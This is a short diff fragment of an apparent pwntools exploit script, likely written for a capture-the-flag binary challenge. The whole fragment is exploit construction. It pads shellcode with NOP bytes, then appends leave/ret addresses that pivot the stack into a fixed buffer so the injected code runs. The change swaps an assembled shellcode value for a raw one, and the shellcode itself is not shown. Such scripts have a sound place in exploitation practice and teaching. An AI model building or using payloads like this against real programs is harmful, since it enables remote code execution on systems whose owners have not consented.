@@ -66,7 +66,7 @@ payload += p64(0x4005d5)
 
 r.sendline(payload)
 
-payload = asm(shellcode)
+payload = shellcode
 payload += '\x90' * (0x400 - len(payload))
 payload += p64(0x6010a0 + 0x400)  # leave
 payload += p64(0x6010a0) # ret
